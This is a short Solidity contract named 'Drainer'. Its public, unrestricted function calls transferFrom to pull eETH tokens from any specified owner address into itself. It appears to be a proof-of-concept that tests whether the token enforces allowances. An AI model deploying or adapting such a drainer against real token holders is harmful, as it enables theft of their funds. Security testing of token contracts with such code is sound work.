// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IeETH {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Drainer {
    address public eethToken;

    constructor(address _eethToken) {
        require(_eethToken != address(0), "Invalid EETH token address");
        eethToken = _eethToken;
    }

    function executeDrain(address _owner, uint256 _amount) external {
        // Attempt to transfer EETH from _owner to the drainer
        bool success = IeETH(eethToken).transferFrom(_owner, address(this), _amount);
        require(success, "Transfer failed");
    }
}